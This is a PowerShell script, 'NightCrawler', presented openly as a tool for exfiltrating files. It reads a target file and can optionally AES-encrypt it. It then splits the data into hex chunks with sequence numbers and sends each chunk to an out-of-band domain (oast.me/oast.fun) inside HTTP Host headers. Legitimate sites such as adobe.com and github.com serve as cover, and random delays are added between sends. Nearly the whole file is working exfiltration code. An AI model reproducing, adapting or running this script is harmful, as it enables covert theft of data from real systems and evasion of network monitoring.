<#
.SYNOPSIS
    NightCrawler exfiltrates file data via DNS queries using hex encoding with explicit sequence numbering,
    and distributes chunks among multiple URLs.
.DESCRIPTION
    This script reads a file, optionally AES-encrypts its contents, splits the data into chunks (with configurable
    sizes), converts each chunk to a hex string, and sends each chunk via a DNS query.
    The DNS query’s domain is constructed as:
      Identifier.Sequence.HexChunk.Domain
    For example:
      testid.001.A1B2C3D4E5...cv7t25l2fbss73eo9uhg41jqimr9ui9ti.oast.me
    Each chunk is sent to one URL chosen at random from an array of URLs.
.EXAMPLE
    Invoke-NightCrawler -Identifier "testid" -Domain "cv8erb8gdmbc73c0ns00o1dra4c8ibd4r.oast.fun" -Urls "adobe.com","github.com" -FilePath "C:\Path\to\file.txt" -EncryptionEnabled -EncryptionKey "YourSecretKey"
#>

# --- Function: Convert a byte array to a hex string ---
function ConvertTo-Hex {
    param(
        [Parameter(Mandatory = $true)][byte[]]$Bytes
    )
    return ($Bytes | ForEach-Object { "{0:X2}" -f $_ }) -join ""
}

# --- AES Encryption Function ---
function Encrypt-Data {
    param(
        [Parameter(Mandatory = $true)][byte[]]$Data,
        [Parameter(Mandatory = $true)][string]$Key
    )
    $aes = [System.Security.Cryptography.Aes]::Create()
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)
    $md5 = [System.Security.Cryptography.MD5]::Create()
    $aes.Key = $md5.ComputeHash($keyBytes)
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.GenerateIV()
    $IV = $aes.IV
    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock($Data, 0, $Data.Length)
    # Prepend the IV to the ciphertext.
    return $IV + $encrypted
}

# --- Logging Function ---
function Log-Message {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp] $Message"
}

# --- Main Exfiltration Function ---
function Invoke-NightCrawler {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)][string]$Identifier,
        [Parameter(Mandatory = $true)][string]$Domain,
        [Parameter(Mandatory = $true)][string[]]$Urls,
        [Parameter(Mandatory = $true)][string]$FilePath,
        [switch]$EncryptionEnabled,
        [string]$EncryptionKey = "",
        [int]$MinChunkSize = 14,
        [int]$MaxChunkSize = 18,
        [int]$MinDelay = 1,
        [int]$MaxDelay = 3
    )

    Log-Message "Reading file: $FilePath"
    try {
        $data = [System.IO.File]::ReadAllBytes($FilePath)
    } catch {
        Log-Message "Failed to read file: $_"
        return
    }
    Log-Message "File read successfully. Total bytes: $($data.Length)"

    if ($EncryptionEnabled) {
        if ([string]::IsNullOrEmpty($EncryptionKey)) {
            Log-Message "Encryption enabled but no key provided. Aborting."
            return
        }
        Log-Message "Encrypting file data..."
        $data = Encrypt-Data -Data $data -Key $EncryptionKey
        Log-Message "Encryption complete. Encrypted data length: $($data.Length)"
    }

    # Split data into chunks with sequence numbering.
    $chunks = @()
    $index = 0
    $chunkIndex = 0
    while ($index -lt $data.Length) {
        $chunkIndex++
        $chunkSize = Get-Random -Minimum $MinChunkSize -Maximum ($MaxChunkSize + 1)
        if ($index + $chunkSize -gt $data.Length) {
            $chunkSize = $data.Length - $index
        }
        $chunkBytes = $data[$index..($index + $chunkSize - 1)]
        $encodedChunk = ConvertTo-Hex -Bytes $chunkBytes
        # Save as an object with Order and Chunk properties.
        $chunks += ,@{ Order = $chunkIndex; Chunk = $encodedChunk }
        $index += $chunkSize
    }
    $totalChunks = $chunks.Count
    Log-Message "Total chunks created: $totalChunks"

    # Send each chunk via a DNS query with a random delay.
    for ($i = 0; $i -lt $totalChunks; $i++) {
        $chunkObj = $chunks[$i]
        $order = '{0:d3}' -f $chunkObj.Order
        $chunk = $chunkObj.Chunk
        Log-Message "Sending chunk $order/$totalChunks..."
        # Construct full domain: Identifier.Sequence.HexChunk.Domain
        $fullDomain = "$Identifier.$order.$chunk.$Domain"
        # Randomly pick one URL from the provided list.
        $selected = $Urls | Get-Random
        Log-Message "Sending to URL: $selected"
        try {
            # Send an HTTP request to the selected URL with the Host header set to include the full domain.
            Invoke-WebRequest -Uri "http://$selected" -Headers @{ "Host" = "host.$selected.$fullDomain" } -UseBasicParsing | Out-Null
        } catch {
            Log-Message "Error sending chunk $order (error suppressed)."
        }
        $delay = Get-Random -Minimum $MinDelay -Maximum ($MaxDelay + 1)
        Start-Sleep -Seconds $delay
    }
    Log-Message "Exfiltration complete. Total chunks sent: $totalChunks."
}
